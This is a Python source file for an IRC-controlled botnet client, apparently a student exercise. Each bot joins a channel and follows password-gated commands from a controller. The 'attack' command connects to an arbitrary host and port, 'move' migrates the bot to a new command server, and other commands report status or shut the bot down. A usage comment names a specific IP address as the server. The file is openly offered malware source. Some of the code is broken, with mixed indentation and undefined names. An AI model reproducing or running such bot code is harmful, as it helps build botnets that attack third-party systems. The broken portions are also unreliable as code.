import random, socket, sys

HOST = ""
PORT = -1
NICK = ""
PASS = ""
CHAN = ""

BUF_SIZE = 1024

botName = ""



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#arguments hostname port channel secret-phrase


def startConn():



    while 1:
        botNum = ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for i in range(6))
        global botName
        botName = "nicebot-" + botNum

        usr = "USER %s %s %s :%s\r\n" % (botName, botName, botName, botName)

        s.send(usr.encode('utf-8'))
        nick = "NICK %s \r\n" % (botName)
        s.send(nick.encode('utf-8'))
        rec = s.recv(1024).decode("utf-8")
        print(rec)
        prefix, command, args = parsemsg(rec)

        if command != "433":
            break

    chan = "JOIN %s\r\n" % (CHAN)
    s.send(chan.encode('utf-8'))
    listen(s)

def listen(s):


    while 1:
       rec = s.recv(1024).decode("utf-8")
       prefix, command, args = parsemsg(rec)
       print("prefix: "+prefix)
       print("command: " + command)
       print("args: " + str(args))

       if (command=="PING"):
           s.send(("PONG :"+args[0].rstrip()).encode('utf-8'))

       if (command =="PRIVMSG"):
            msg = args[1].rstrip().split(" ")
            print(str(msg))
            if (msg[0]== PASS):
                if msg[1] == "status":
                    clientNick = prefix.split("!")
                    print(clientNick[0])
                    status(clientNick[0],s)
                elif msg[1] == "attack":
                    attack(msg[2], msg[3])
                elif msg[1] == "move":
					clientNick = prefix.split("!")
                    print(clientNick[0])
                    break
                elif msg[1] == "shutdown":
                    shutdown()

       print(rec)

    move(msg[2], msg[3], msg[4], clientNick)


#from carlos' twitch IRC bot, idk if it works with other IRCs
def parsemsg(s):
    """Breaks a message from an IRC server into its prefix, command, and arguments.
    """
    prefix = ''
    trailing = []
    if not s:
        raise IRCBadMessage("Empty line.")
    if s[0] == ':':
        prefix, s = s[1:].split(' ', 1)
    if s.find(' :') != -1:
        s, trailing = s.split(' :', 1)
        args = s.split()
        args.append(trailing)
    else:
        args = s.split()
    command = args.pop(0)

    # parsemsg(":test!~test@test.com PRIVMSG #channel :Hi!")
    # ('test!~test@test.com', 'PRIVMSG', ['#channel', 'Hi!'])

    return prefix, command, args

def status(clinetNick,s):

    msg = "PRIVMSG "+clinetNick+" :" +PASS + "status "+botName+"\r\n"
    print(msg)
    s.send(msg.encode('utf-8'))
    #private message controller

def attack(atkhost, atkport):
    atkmsg = "1"
    success = False
    try:
        atkSock = socket.socket()
        atkSock.connect((atkhost, atkport))
        atkSock.send(atkmsg)
        atkSock.close()
        success = True
    except:
        print("attack failed")

    #report back to controller

def move(newhost, newport, newchan, clientNick):
	reportmsg = "PRIVMSG %s %s moved" % (clientNick, PASS)
	s.send(reportmsg.encode('utf-8'))
    success = False
    s.send(("QUIT").encode('utf-8'))
    s.close()
    global HOST
    HOST=newhost
    global PORT
    PORT=int(newport)
    global CHAN
    CHAN="#"+newchan

    s2 = None
    try:
        print(HOST)
        print(PORT)

        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2.connect((HOST, PORT))
    except:
        print("failed to move to new channel")  # we may want to handle a few more specific errors, this is general for now
		sys.exit(1)

        #join IRC
    usr = "USER %s %s %s :%s\r\n" % (botName, botName, botName, botName)
    s2.send(usr.encode('utf-8'))
    nic = "NICK %s \r\n" % (botName)
    s2.send(nic.encode('utf-8'))
    chan = "JOIN %s\r\n" % (CHAN)
    s2.send(chan.encode('utf-8'))
    success = True
    listen(s2)

    #if failure, keep trying? or maybe stay on old IRC?

def shutdown():
    shutdownmsg = " disconnected" #needs to be formatted properly for a private message
    s.send(("QUIT").encode('utf-8'))
    sys.exit(0)


# python bot.py 199.116.235.44 12399 group12 pass
if __name__ == '__main__':
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    CHAN = "#" + sys.argv[3]
    PASS = sys.argv[4]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    startConn()
